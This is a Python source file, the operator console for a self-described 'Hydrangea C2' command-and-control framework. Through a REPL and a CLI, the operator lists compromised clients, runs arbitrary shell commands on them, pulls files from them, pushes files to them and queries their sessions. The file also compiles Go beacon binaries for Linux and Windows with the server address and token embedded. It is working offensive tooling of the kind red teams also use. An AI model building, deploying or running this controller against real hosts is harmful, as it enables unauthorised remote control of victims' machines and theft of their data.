#!/usr/bin/env python3
"""
start server (will use 127.0.0.1 as default):
  python serverctl.py --port 9000 --auth-token supersecret --start-srv

usage (REPL):
  python serverctl.py --port 9000 --auth-token supersecret --repl
  # or simply omit a subcommand:
  python serverctl.py --port 9000 --auth-token supersecret

Usage (classic):
  python serverctl.py --port 9000 --auth-token supersecret clients
"""

import argparse
import asyncio
import json
import os
import shlex
import sys
import subprocess
from typing import Dict, Optional, Tuple

from server.common import write_frame, read_frame
from server.go_builder import build_go_clients
from server.UI import *


# ---------- wire ----------
async def admin_send(
    host: str, port: int, auth_token: str, header: dict, payload: bytes = b""
):
    reader, writer = await asyncio.open_connection(host, port)
    admin_header = {"type": "ADMIN", "token": auth_token}
    admin_header.update(header)
    await write_frame(writer, admin_header, payload)
    resp, resp_payload = await read_frame(reader)
    writer.close()
    await writer.wait_closed()
    return resp, resp_payload


class NoExitArgumentParser(argparse.ArgumentParser):
    def error(self, message):  # don't sys.exit; raise for REPL handling
        raise ValueError(message)


def build_repl_parser() -> Tuple[
    argparse.ArgumentParser, Dict[str, argparse.ArgumentParser]
]:
    p = NoExitArgumentParser(prog=">>")
    sub = p.add_subparsers(dest="cmd")

    # context commands
    sp = sub.add_parser("use", help="Set the active client for subsequent commands")
    sp.add_argument("client", help="Client ID to use")

    sp = sub.add_parser("unuse", help="Clear the active client (or only if it matches)")
    sp.add_argument(
        "client", nargs="?", help="Optional client ID to unuse (must match current)"
    )

    # regular commands (client optional in REPL; will use active context)
    sub.add_parser("clients", help="List connected clients")

    sp = sub.add_parser("ping", help="Ping a client")
    sp.add_argument("--client", required=False)

    sp = sub.add_parser("list", help="List directory on client")
    sp.add_argument("--client", required=False)
    sp.add_argument("--path", default=".")
    sp.add_argument("--wait", action="store_true", help="Wait for result and render")
    sp.add_argument(
        "--timeout", type=float, default=10.0, help="Seconds to wait when --wait"
    )

    sp = sub.add_parser("pull", help="Pull a file from client to server")
    sp.add_argument("--client", required=False)
    sp.add_argument("--src", required=True)
    sp.add_argument("--dest", required=True)

    sp = sub.add_parser("push", help="Push a local file to client")
    sp.add_argument("--client", required=False)
    sp.add_argument("--src", required=True, help="Local path to send")
    sp.add_argument("--dest", required=True, help="Destination path on client")

    sp = sub.add_parser("exec", help="Execute a command on the client")
    sp.add_argument("--client", required=False)
    sp.add_argument(
        "--command",
        required=True,
        help='Command string or JSON list (e.g. "[\\"ls\\",\\"-la\\"]")',
    )
    sp.add_argument("--shell", action="store_true", help="Run via shell")
    sp.add_argument("--cwd", help="Working directory on client")
    sp.add_argument(
        "--timeout", type=float, default=30.0, help="Seconds to wait for command"
    )

    sp = sub.add_parser("session", help="Fetch session info from client")
    sp.add_argument("--client", required=False)
    sp.add_argument("--timeout", type=float, default=5.0)

    # build-client (REPL)
    sp = sub.add_parser(
        "build-client",
        help="Compile Go clients from ./client/go with hard-coded server details",
    )
    sp.add_argument("--server-host", default=None)
    sp.add_argument("--server-port", type=int, default=None)
    sp.add_argument("--build-auth-token", default=None)
    sp.add_argument("--client-id", default=None)
    sp.add_argument("--out", default="./dist")
    sp.add_argument("--os", action="append", choices=["linux", "windows"])
    sp.add_argument("--arch", default="amd64", choices=["amd64", "arm64"])

    # server-status (REPL)
    sub.add_parser("server-status", help="Check the server's health status")

    # meta
    sub.add_parser("help", help="Show help or 'help <command>'")
    sub.add_parser("quit", help="Exit the console")
    sub.add_parser("exit", help="Exit the console")

    # Return also a mapping for subparser lookups (for help display)
    subparsers_map = {a.dest: a for a in []}  # placeholder for type clarity
    return p, {sp_prog(p): p for p in sub._name_parser_map.values()}


def sp_prog(p: argparse.ArgumentParser) -> str:
    # Retrieve the subparser's program name (command) robustly
    # argparse stores it in .prog; last token is the subcommand
    return p.prog.split()[-1]


# Optional: minimal readline support (history + command completion for verbs)
try:
    import readline  # type: ignore

    def _setup_readline(commands):
        def completer(text, state):
            options = [c for c in commands if c.startswith(text)]
            if state < len(options):
                return options[state]
            return None

        readline.set_completer(completer)
        readline.parse_and_bind("tab: complete")
        histfile = os.path.expanduser("~/.hydrangea_history")
        try:
            readline.read_history_file(histfile)
        except Exception:
            pass
        import atexit

        atexit.register(lambda: _save_history(histfile))

    def _save_history(path):
        try:
            readline.write_history_file(path)
        except Exception:
            pass
except Exception:
    readline = None

    def _setup_readline(_):
        return


# ---------- REPL loop ----------


async def run_repl(args) -> None:
    ui = UI(
        use_color=(not args.no_color), show_banner=(not args.no_banner), quiet=False
    )
    ui.banner()

    repl_parser, sub_map = build_repl_parser()
    commands = sorted([k for k in sub_map.keys() if k not in {"help"}]) + [
        "help",
        "quit",
        "exit",
    ]

    # active client context
    current_client: Optional[str] = None

    _setup_readline(commands)

    help_header = (
        "Type 'help' to see commands, 'help <cmd>' for details. Examples:\n"
        "  >> clients                       # list connected clients\n"
        "  >> use laptop1                   # set active client\n"
        '  >> exec --command "uname -a"     # uses active client\n'
        "  >> list --path /etc --wait       # also uses active client\n"
        "  >> unuse                         # clear active client\n"
        "  >> build-client --server-host 10.0.0.5 --server-port 9000 --build-auth-token supersecret # build client beacons\n"
    )

    while True:
        right = f"client: {current_client}" if current_client else "client: (none)"
        ui.statusbar(f"\nHydrangea C2 • {args.host}:{args.port}", right)
        try:
            line = input(ui.c(">> ", "cyan")).strip()
        except (EOFError, KeyboardInterrupt):
            print("\n")
            print(ui.TAG_INF, "Goodbye.")
            return

        if not line:
            continue

        if line.startswith("#"):
            continue

        if line.lower() in {"help", "?"}:
            ui.rule(" commands ")
            print(help_header)
            for cmd in commands:
                if cmd in ("quit", "exit"):
                    continue
                sp = sub_map.get(cmd)
                if sp:
                    print(
                        f"  {ui.c(cmd, 'bold')}: {sp.description or sp.format_usage().strip()}"
                    )
            print("  quit / exit: leave the console")
            ui.rule()
            continue

        if line.lower().startswith("help "):
            _, _, cmd = line.partition(" ")
            sp = sub_map.get(cmd.strip())
            if not sp:
                print(ui.TAG_ERR, f"Unknown command: {cmd}")
                continue
            ui.rule(f" help: {cmd} ")
            print(sp.format_help())
            ui.rule()
            continue

        if line.lower() in {"quit", "exit"}:
            print(ui.TAG_INF, "Goodbye.")
            return

        # Parse via argparse
        try:
            ns = repl_parser.parse_args(shlex.split(line))
        except ValueError as e:
            print(ui.TAG_ERR, str(e))
            continue
        except SystemExit:
            continue

        cmd = getattr(ns, "cmd", None)
        if not cmd:
            print(ui.TAG_ERR, "No command parsed. Type 'help'.")
            continue

        # ---- context commands ----
        if cmd == "use":
            prev = current_client
            current_client = ns.client.strip()
            if prev and prev != current_client:
                print(
                    f"{ui.TAG_INF} switched client {ui.c(prev, 'bold')} → {ui.c(current_client, 'bold')}"
                )
            else:
                print(f"{ui.TAG_OK} using client {ui.c(current_client, 'bold')}")
            continue

        if cmd == "unuse":
            if ns.client and current_client and ns.client != current_client:
                print(
                    f"{ui.TAG_INF} current is {ui.c(current_client, 'bold')}; did not unuse {ui.c(ns.client, 'bold')}"
                )
                continue
            if current_client:
                print(f"{ui.TAG_OK} cleared client {ui.c(current_client, 'bold')}")
            else:
                print(f"{ui.TAG_INF} no active client to clear")
            current_client = None
            continue

        # helper to resolve client in REPL (flag or active)
        def _resolve_client(flag_value: Optional[str]) -> Optional[str]:
            return flag_value or current_client

        # ---- dispatch regular commands ----
        if cmd == "clients":
            resp, _ = await admin_send(
                args.host, args.port, args.auth_token, {"action": "clients"}
            )
            print_clients(ui, resp)
            print(ui.c("Tip: use <client_id> to set an active client.", "dim"))
            continue

        if cmd == "ping":
            target = _resolve_client(ns.client)
            if not target:
                print(
                    ui.TAG_ERR,
                    "No client specified. Use '--client <id>' or set one via 'use <id>'.",
                )
                continue
            resp, _ = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {"action": "ping", "target_id": target},
            )
            if resp.get("type") == "OK":
                print(f"{ui.TAG_OK} ping sent to {ui.c(target, 'bold')}")
            else:
                print_error(ui, resp)
            continue

        if cmd == "list":
            target = _resolve_client(ns.client)
            if not target:
                print(
                    ui.TAG_ERR,
                    "No client specified. Use '--client <id>' or set one via 'use <id>'.",
                )
                continue
            resp, payload = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {
                    "action": "list",
                    "target_id": target,
                    "path": ns.path,
                    "wait": ns.wait,
                    "timeout": ns.timeout,
                },
            )
            if ns.wait:
                print_list(ui, ns.path, resp, payload)
            else:
                print_queued(ui, resp)
            continue

        if cmd == "pull":
            target = _resolve_client(ns.client)
            if not target:
                print(
                    ui.TAG_ERR,
                    "No client specified. Use '--client <id>' or set one via 'use <id>'.",
                )
                continue
            resp, _ = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {"action": "pull", "target_id": target, "src": ns.src, "dest": ns.dest},
            )
            if resp.get("type") == "QUEUED":
                print_queued(ui, resp)
                hint = f"{ui.c('Note:', 'dim')} file will appear in server storage (or absolute dest) when client completes."
                print(f"{ui.TAG_INF} {hint}")
            else:
                print_error(ui, resp)
            continue

        if cmd == "push":
            target = _resolve_client(ns.client)
            if not target:
                print(
                    ui.TAG_ERR,
                    "No client specified. Use '--client <id>' or set one via 'use <id>'.",
                )
                continue
            if not os.path.isfile(ns.src):
                print(ui.TAG_ERR, f"Local file not found: {ns.src}")
                continue
            try:
                with open(ns.src, "rb") as f:
                    data = f.read()
            except Exception as e:
                print(f"{ui.TAG_ERR} cannot read {ns.src}: {e}")
                continue
            resp, _ = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {
                    "action": "push",
                    "target_id": target,
                    "dest": ns.dest,
                    "src_name": os.path.basename(ns.src),
                },
                data,
            )
            if resp.get("type") == "QUEUED":
                print_queued(ui, resp)
            else:
                print_error(ui, resp)
            continue

        if cmd == "exec":
            target = _resolve_client(ns.client)
            if not target:
                print(
                    ui.TAG_ERR,
                    "No client specified. Use '--client <id>' or set one via 'use <id>'.",
                )
                continue
            cmd_value = ns.command
            try:
                cmd_value = json.loads(cmd_value)  # allow JSON list
            except Exception:
                pass
            resp, payload = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {
                    "action": "exec",
                    "target_id": target,
                    "cmd": cmd_value,
                    "shell": ns.shell,
                    "cwd": ns.cwd,
                    "timeout": ns.timeout,
                },
            )
            print_exec(ui, target, resp, payload)
            continue

        if cmd == "session":
            target = _resolve_client(ns.client)
            if not target:
                print(
                    ui.TAG_ERR,
                    "No client specified. Use '--client <id>' or set one via 'use <id>'.",
                )
                continue
            resp, payload = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {"action": "session_info", "target_id": target, "timeout": ns.timeout},
            )
            print_session(ui, target, resp, payload)
            continue

        if cmd == "build-client":
            # inherit controller defaults if not provided
            if ns.server_host is None:
                ns.server_host = args.host
            if ns.server_port is None:
                ns.server_port = args.port
            if ns.build_auth_token is None:
                ns.build_auth_token = args.auth_token
            try:
                build_go_clients(ui, ns)
            except Exception as e:
                print(f"{ui.TAG_ERR} build error: {e}")
            continue

        if cmd == "server-status":
            resp, _ = await admin_send(
                args.host, args.port, args.auth_token, {"action": "health_status"}
            )
            if resp.get("type") == "HEALTH_STATUS":
                ui.rule(" server health status ")
                ui.kv("Status", resp.get("status"))
                ui.kv("Connected Agents", resp.get("connected_agents"))
                ui.rule(" recent logs ")
                for log_entry in resp.get("recent_logs", []):
                    print(log_entry)
                ui.rule()
            else:
                print_error(ui, resp)
            continue

        print(ui.TAG_ERR, f"Unknown command: {cmd}")


# ---------- Classic CLI (unchanged semantics + build-client) ----------


async def classic_cli(args):
    ui = UI(
        use_color=(not args.no_color),
        show_banner=(not args.no_banner),
        quiet=args.quiet,
    )

    if not ui.quiet:
        ui.banner()

    if args.subcmd == "clients":
        resp, _ = await admin_send(
            args.host, args.port, args.auth_token, {"action": "clients"}
        )
        print_clients(ui, resp)
        return

    if args.subcmd == "ping":
        resp, _ = await admin_send(
            args.host,
            args.port,
            args.auth_token,
            {"action": "ping", "target_id": args.client},
        )
        if resp.get("type") == "OK":
            print(f"{ui.TAG_OK} ping sent to {ui.c(args.client, 'bold')}")
        else:
            print_error(ui, resp)
        return

    if args.subcmd == "list":
        resp, payload = await admin_send(
            args.host,
            args.port,
            args.auth_token,
            {
                "action": "list",
                "target_id": args.client,
                "path": args.path,
                "wait": args.wait,
                "timeout": args.timeout,
            },
        )
        if args.wait:
            print_list(ui, args.path, resp, payload)
        else:
            print_queued(ui, resp)
        return

    if args.subcmd == "pull":
        resp, _ = await admin_send(
            args.host,
            args.port,
            args.auth_token,
            {
                "action": "pull",
                "target_id": args.client,
                "src": args.src,
                "dest": args.dest,
            },
        )
        if resp.get("type") == "QUEUED":
            print_queued(ui, resp)
            hint = f"{ui.c('Note:', 'dim')} file will appear in server storage (or absolute dest) when client completes."
            print(f"{ui.TAG_INF} {hint}")
        else:
            print_error(ui, resp)
        return

    if args.subcmd == "push":
        try:
            with open(args.src, "rb") as f:
                data = f.read()
        except Exception as e:
            print(f"{ui.TAG_ERR} cannot read {args.src}: {e}")
            return
        resp, _ = await admin_send(
            args.host,
            args.port,
            args.auth_token,
            {
                "action": "push",
                "target_id": args.client,
                "dest": args.dest,
                "src_name": os.path.basename(args.src),
            },
            data,
        )
        if resp.get("type") == "QUEUED":
            print_queued(ui, resp)
        else:
            print_error(ui, resp)
        return

    if args.subcmd == "exec":
        cmd_value = args.command
        try:
            cmd_value = json.loads(cmd_value)
        except Exception:
            pass
        resp, payload = await admin_send(
            args.host,
            args.port,
            args.auth_token,
            {
                "action": "exec",
                "target_id": args.client,
                "cmd": cmd_value,
                "shell": args.shell,
                "cwd": args.cwd,
                "timeout": args.timeout,
            },
        )
        print_exec(ui, args.client, resp, payload)
        return

    if args.subcmd == "session":
        resp, payload = await admin_send(
            args.host,
            args.port,
            args.auth_token,
            {
                "action": "session_info",
                "target_id": args.client,
                "timeout": args.timeout,
            },
        )
        print_session(ui, args.client, resp, payload)
        return

    if args.subcmd == "build-client":
        # Default to controller flags if per-build flags omitted
        if args.server_host is None:
            args.server_host = args.host
        if args.server_port is None:
            args.server_port = args.port
        if args.build_auth_token is None:
            args.build_auth_token = args.auth_token
        try:
            build_go_clients(ui, args)
        except Exception as e:
            print(f"{ui.TAG_ERR} build error: {e}")
        return

    if args.subcmd == "server-status":
        resp, _ = await admin_send(
            args.host, args.port, args.auth_token, {"action": "health_status"}
        )
        if resp.get("type") == "HEALTH_STATUS":
            print("Server Health Status:")
            print(f"  Status: {resp.get('status')}")
            print(f"  Connected Agents: {resp.get('connected_agents')}")
            print("  Recent Logs:")
            for log_entry in resp.get("recent_logs", []):
                print(f"    {log_entry}")
        else:
            print("Error fetching server status:")
            print(resp)
        return


def start_server(args):
    ui = UI(
        use_color=(not args.no_color),
        show_banner=(not args.no_banner),
        quiet=args.quiet,
    )
    ui.rule(" start server ")
    ui.headline(f"{ui.TAG_INF} Starting Hydrangea server...")
    ui.kv("Host", args.host)
    ui.kv("Port", args.port)
    ui.kv("Auth Token", args.auth_token)
    ui.hr()
    cmd = [
        sys.executable,
        "Hydrangea-server.py",
        "--host",
        args.host,
        "--port",
        str(args.port),
        "--auth-token",
        args.auth_token,
    ]
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        ui.headline(f"{ui.TAG_OK} Server process started (PID {proc.pid})")
    except Exception as e:
        ui.headline(f"{ui.TAG_ERR} Failed to start server: {e}")
    ui.rule()


# ---------- CLI ----------


async def main():
    ap = argparse.ArgumentParser(description="Hydrangea C2 controller (REPL + classic)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--auth-token", required=True)
    ap.add_argument(
        "--start-srv", action="store_true", help="Start server with given parameters"
    )

    # UI flags
    ap.add_argument("--no-color", action="store_true", help="Disable ANSI colors")
    ap.add_argument("--no-banner", action="store_true", help="Hide ASCII banner")
    ap.add_argument("--quiet", action="store_true", help="Less chatter")
    ap.add_argument("--repl", action="store_true", help="Force interactive REPL mode")

    sub = ap.add_subparsers(dest="subcmd")

    sub.add_parser("clients", help="List connected clients")

    sp = sub.add_parser("ping", help="Ping a client")
    sp.add_argument("--client", required=True)

    sp = sub.add_parser("list", help="List directory on client")
    sp.add_argument("--client", required=True)
    sp.add_argument("--path", default=".")
    sp.add_argument("--wait", action="store_true", help="Wait for result and render")
    sp.add_argument(
        "--timeout", type=float, default=10.0, help="Seconds to wait when --wait"
    )

    sp = sub.add_parser(
        "pull",
        help="Pull a file from client to server storage (or absolute path on server)",
    )
    sp.add_argument("--client", required=True)
    sp.add_argument("--src", required=True)
    sp.add_argument("--dest", required=True)

    sp = sub.add_parser("push", help="Push a file from this machine to client")
    sp.add_argument("--client", required=True)
    sp.add_argument("--src", required=True, help="Local path to send")
    sp.add_argument("--dest", required=True, help="Destination path on client")

    sp = sub.add_parser(
        "exec", help="Execute a system command on the client and return output"
    )
    sp.add_argument("--client", required=True)
    sp.add_argument(
        "--command",
        required=True,
        help='Command string or JSON list (e.g. "[\\"ls\\",\\"-la\\"]")',
    )
    sp.add_argument("--shell", action="store_true", help="Run via shell")
    sp.add_argument("--cwd", help="Working directory on client")
    sp.add_argument(
        "--timeout", type=float, default=30.0, help="Seconds to wait for command"
    )

    sp = sub.add_parser("session", help="Fetch session info from client")
    sp.add_argument("--client", required=True)
    sp.add_argument("--timeout", type=float, default=5.0)

    # build Go clients (no embedding, uses ./client/go)
    bp = sub.add_parser(
        "build-client",
        help="Compile Go clients from ./client/go with hard-coded server details",
    )
    bp.add_argument(
        "--server-host", help="Server host/IP to embed (default: --host)", default=None
    )
    bp.add_argument(
        "--server-port",
        type=int,
        help="Server port to embed (default: --port)",
        default=None,
    )
    bp.add_argument(
        "--build-auth-token",
        help="Auth token to embed (default: --auth-token)",
        default=None,
    )
    bp.add_argument(
        "--client-id", help="Optional fixed client ID to embed", default=None
    )
    bp.add_argument("--out", default="./dist", help="Output directory for binaries")
    bp.add_argument(
        "--os",
        action="append",
        choices=["linux", "windows"],
        help="Target OS (repeatable). Default: linux+windows",
    )
    bp.add_argument(
        "--arch",
        default="amd64",
        choices=["amd64", "arm64"],
        help="Target arch (default amd64)",
    )

    sp = sub.add_parser("server-status", help="Check the server's health status")

    args = ap.parse_args()

    if args.start_srv:
        start_server(args)

    # REPL when --repl or no subcommand
    if args.repl or not args.subcmd:
        await run_repl(args)
    else:
        await classic_cli(args)


if __name__ == "__main__":
    asyncio.run(main())
